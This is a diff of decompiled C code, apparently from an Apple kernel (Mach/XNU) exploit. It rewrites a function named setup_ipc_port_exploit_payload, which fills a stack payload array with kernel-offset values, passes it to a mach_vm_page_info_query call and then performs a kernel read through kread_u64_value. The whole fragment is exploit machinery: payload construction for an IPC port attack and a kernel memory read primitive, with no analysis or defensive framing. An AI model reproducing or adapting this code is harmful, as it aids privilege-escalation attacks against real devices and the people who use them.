@@ -10338,22 +10338,9 @@ __int64 __fastcall setup_ipc_port_exploit_payload(__int64 a1, __int64 a2, int a3
   __int64 v12; // x10
   __int64 v13; // x0
   __int64 v14; // x1
-  __int128 v16[9]; // [xsp+0h] [xbp-140h] BYREF
-  __int128 v17; // [xsp+90h] [xbp-B0h]
-  __int128 v18; // [xsp+A0h] [xbp-A0h]
-  __int128 v19; // [xsp+B0h] [xbp-90h]
-  __int128 v20; // [xsp+C0h] [xbp-80h]
-  __int128 v21; // [xsp+D0h] [xbp-70h]
-  __int128 v22; // [xsp+E0h] [xbp-60h]
-  __int64 vars8; // [xsp+148h] [xbp+8h]
+  uint64_t payload[30]; // [xsp+0h] [xbp-140h] BYREF
 
-  v21 = 0u;
-  v22 = 0u;
-  v19 = 0u;
-  v20 = 0u;
-  v17 = 0u;
-  v18 = 0u;
-  memset(v16, 0, sizeof(v16));
+  memset(payload, 0, sizeof(payload));
   v7 = *(uint64_t *)(a1 + 632);
   if ( v7 )
   {
@@ -10373,7 +10360,7 @@ __int64 __fastcall setup_ipc_port_exploit_payload(__int64 a1, __int64 a2, int a3
     {
       if ( (unsigned int)v9 < 8 || (uint32_t)v9 == 15 )
       {
-        *((uint64_t *)v16 + v9) = *(uint64_t *)(a4 + 8 * v9);
+        payload[v9] = *(uint64_t *)(a4 + 8 * v9);
       }
       else
       {
@@ -10387,10 +10374,10 @@ __int64 __fastcall setup_ipc_port_exploit_payload(__int64 a1, __int64 a2, int a3
   }
   v11 = *(uint64_t *)(a1 + 664);
   v12 = *(uint64_t *)(a1 + 376);
-  *((uint64_t *)&v17 + 1) = v11 + 61416;
-  *((uint64_t *)&v18 + 1) = v12;
-  *((uint64_t *)&v19 + 1) = v11 + 61312;
-  mach_vm_page_info_query((uint64_t *)a1, a2, *(uint32_t *)(a1 + 660), qword_48038, v7, (__int64)v16);
+  payload[19] = v11 + 61416;
+  payload[21] = v12;
+  payload[23] = v11 + 61312;
+  mach_vm_page_info_query((uint64_t *)a1, a2, *(uint32_t *)(a1 + 660), qword_48038, v7, (__int64)payload);
   v13 = *(uint64_t *)(a1 + 8);
   v14 = *(uint64_t *)(a1 + 664) + 61440LL;
   return kread_u64_value(v13, v14);
